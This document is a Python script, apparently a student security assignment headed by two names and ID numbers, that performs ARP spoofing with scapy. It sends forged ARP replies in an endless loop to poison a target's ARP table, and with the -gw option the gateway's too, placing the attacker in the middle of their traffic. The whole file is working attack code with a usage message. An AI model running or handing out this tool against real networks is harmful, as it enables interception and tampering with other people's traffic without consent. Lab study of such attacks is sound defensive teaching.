# Yedidia Bakuradze: 332461854
# Meir Crombie: 214736688

import sys
import subprocess
from scapy.all import ARP, Ether, sendp,srp
from time import sleep
help_msg = """
usage: ArpSpoofer.py [-h] [-i IFACE] [-s SRC] [-d DELAY] [-gw] -t TARGET

Spoof ARP tables

optional arguments:
    -h, --help show this help message and exit
    -i IFACE, --iface IFACE Interface you wish to use
    -s SRC, --src SRC The address you want for the attacker
    -d DELAY, --delay DELAY Delay (in seconds) between messages
    -gw should GW be attacked as well
    -t TARGET, --target TARGET IP of target
"""
broadcast_mac = "FF:FF:FF:FF:FF:FF"



src_ip = None
dst_ip = None

my_mac = None

config = None
iface = None
full_duplex = False
delay = 0

def send_who_has():
    global my_mac,iface
    
    # Set up source's MAC address
    src_mac = get_mac_by_ip(src_ip)
    if not src_mac:
        print(f"Unable to fetch ${src_ip}'s MAC address")
        return
    
    # Set up destination's MAC address
    dst_mac = get_mac_by_ip(dst_ip)
    if not dst_mac:
        print(f"Unable to fetch ${src_ip}'s MAC address")
        return
    
    # Send is-has ARP packets
    pack =  Ether(dst=dst_mac, src=my_mac) / ARP(
        op=2,
        pdst=dst_ip,
        hwdst=dst_mac,
        psrc=src_ip,
        hwsrc=my_mac
    )
    
    sendp(pack,iface=iface,verbose=False)
    print(f"The destination is under attack! | Attacking: IP: {dst_ip} MAC: {dst_mac} With: {iface} As: IP: {src_ip} MAC: {my_mac}")

    # Tell gw as well
    if full_duplex:
        pack = Ether(dst=src_mac, src=my_mac) / ARP(
            op=2,
            pdst=src_ip,
            hwdst=src_mac,
            psrc=dst_ip,
            hwsrc=my_mac
        )
        print(f"The source is under attack! | Attacking: IP: {src_ip} MAC: {src_mac} With: ${iface} As: IP: {dst_ip} MAC: {dst_mac}")
        sendp(pack,iface=iface,verbose=False)


def get_mac_by_ip(ip):
    global broadcast_mac
    arp = ARP(op=1,pdst=ip)
    broadcast = Ether(dst=broadcast_mac)
    request_broadcast = broadcast / arp
    res, _ = srp(request_broadcast, timeout=1, verbose=False, iface=iface)
    return res[0][1].hwsrc if res else None


def init_state(args):
    global iface, src_ip, delay, full_duplex, dst_ip, my_mac, src_mac,ip_config,dst_mac

    while len(args) > 0:
        # IFACE Set
        if args[0] == '-i' or args[0] == '--iface' :
            # Run the ifconfig command, and search via Regex if interface exsits
            iface = args[1]
            if not iface:  
                print("You must specify the value of the new IFACE")
                exit()
            args = args[2:]
            continue
        
        # Src address
        if args[0] == '-s' or args[0] == '--src' :
            src_ip = args[1]
            if not src_ip:  
                print("You must specify the value of the new SRC address")
                exit()
            args = args[2:]
            continue

        # Delay parameter
        if args[0] == '-d' or args[0] == '--delay' :
            delay = int(args[1])
            if not delay:  
                print("You must specify the value of the delay")
                exit()

            args = args[2:]
            continue
        
        # Should attack gateway as well?
        if args[0] == '-gw' :
            full_duplex = True
            args = args[1:]
            continue

        # Target ip
        if args[0] == '-t' or args[0] == '--target' :
            dst_ip = args[1]
            if not dst_ip:  
                print("You must specify the value of the TARGET")
                exit()

            args = args[2:]
            continue
    

    # Set IFACE value if None to default
    if not iface:
        ip_config = subprocess.run("ip route show default",shell=True, capture_output=True, text=True, check=True).stdout.split()
        iface = ip_config[4] 

    # Set the attacker's MAC address
    my_mac = subprocess.run(f"ip link show dev {iface} | grep link | sed 's/    //'",shell=True, capture_output=True, text=True, check=True).stdout.split()[1]
    
    if not src_ip:
        src_ip = subprocess.run(f"ip route show dev {iface} | grep default",shell=True, capture_output=True, text=True, check=True).stdout.split()[2]

    dst_mac = get_mac_by_ip(dst_ip)
    src_mac = get_mac_by_ip(src_ip)
    
    # Run the attack
    print("=========================")
    print("Preforming ARP spoofing ...")
    if full_duplex:
        print(f"SRC: {src_ip} / {src_mac} ------> Attacker: {my_mac} ------> Des: {dst_ip} / {dst_mac}")
    
    print(f"SRC: {src_ip} / {src_mac} <------ Attacker: {my_mac} <------ Des: {dst_ip} / {dst_mac}")
    print(f"Interface: {iface}")
    print(f"Delay: {delay}")
    print("=========================")

 
def main():
    if len(sys.argv) <= 1: exit()
    args = sys.argv[1:]
    
    # Help printer
    if args[0] == '-h' or args[0] == '--help':
        print(help_msg)
        exit()

    # Settuing up the parameters
    init_state(args)
    
    if dst_ip == None:
        print("Please specify the target value")
        exit()
    
    # The attack
    while True:
        send_who_has()
        sleep(delay)



main()